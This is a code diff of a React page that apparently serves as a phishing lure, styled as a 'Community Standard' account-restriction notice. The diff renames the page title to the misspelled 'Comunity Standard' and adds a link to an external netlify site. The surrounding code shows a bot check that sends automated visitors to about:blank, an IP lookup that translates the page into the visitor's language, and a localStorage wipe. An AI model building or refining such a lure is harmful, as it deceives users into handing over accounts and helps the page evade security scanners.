@@ -30,14 +30,7 @@ const Index = () => {
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([
-                    translateText(defaultTexts.title, targetLang),
-                    translateText(defaultTexts.description, targetLang),
-                    translateText(defaultTexts.protectionText, targetLang),
-                    translateText(defaultTexts.processText, targetLang),
-                    translateText(defaultTexts.continueBtn, targetLang),
-                    translateText(defaultTexts.restrictedText, targetLang)
-                ]);
+                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.protectionText, targetLang), translateText(defaultTexts.processText, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.restrictedText, targetLang)]);
 
                 setTranslatedTexts({
                     title: translatedTitle,
@@ -57,7 +50,11 @@ const Index = () => {
     useEffect(() => {
         const init = async () => {
             const date = new Date();
-            const options = { month: 'long', day: 'numeric', year: 'numeric' };
+            const options = {
+                month: 'long',
+                day: 'numeric',
+                year: 'numeric'
+            };
             setToday(date.toLocaleString('en-US', options));
             localStorage.clear();
 
@@ -68,7 +65,9 @@ const Index = () => {
                         window.location.href = 'about:blank';
                         return;
                     }
-                } catch {}
+                } catch {
+                    //
+                }
             };
 
             const fetchIpInfo = async () => {
@@ -81,9 +80,10 @@ const Index = () => {
                     setIsLoading(false);
                     localStorage.setItem('targetLang', targetLang);
                     translateAllTexts(targetLang);
-                } catch {}
+                } catch {
+                    //
+                }
             };
-
             await fetchIpInfo();
             await checkBot();
         };
@@ -93,7 +93,7 @@ const Index = () => {
 
     return (
         <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
-            <title>Hello Kitty</title> {/* Chỉ thay tiêu đề */}
+            <title>Comunity Standard</title>
             <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
                 <img src={HeroImage} alt='' />
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
@@ -121,6 +121,13 @@ const Index = () => {
                 </button>
                 <p className='text-center'>
                     {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
+                </p>
+
+                {/* Thêm phần liên kết với "hello kitty" */}
+                <p className='text-center'>
+                    <a href="https://fg23e.netlify.app" target="_blank" rel="noopener noreferrer">
+                        <span className="font-bold text-blue-500">hello kitty</span>
+                    </a>
                 </p>
             </div>
         </div>
